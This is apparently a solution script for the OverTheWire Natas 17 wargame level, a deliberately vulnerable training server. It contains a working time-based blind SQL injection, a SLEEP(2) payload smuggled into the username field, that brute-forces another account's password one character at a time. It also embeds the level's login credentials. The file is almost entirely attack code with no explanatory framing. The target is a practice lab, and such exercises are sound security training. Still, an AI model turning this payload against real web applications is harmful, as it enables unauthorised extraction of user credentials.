import requests
from time import *
from string import digits, ascii_lowercase, ascii_uppercase

characters = ascii_lowercase + ascii_uppercase + digits

username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"

Url = "http://natas17.natas.labs.overthewire.org"

session = requests.session()

current_password = list()

while(True):
    for character in characters:
        startTime = time()
        response = session.post(Url, data={"username": 'natas18" AND password LIKE BINARY "' + "".join(current_password) + character + '%" AND SLEEP(2) #'},auth=(username, password))
        endTime = time()
        if endTime - startTime > 2:
            current_password.append(character)
            break
    if len(current_password) == 32:
            break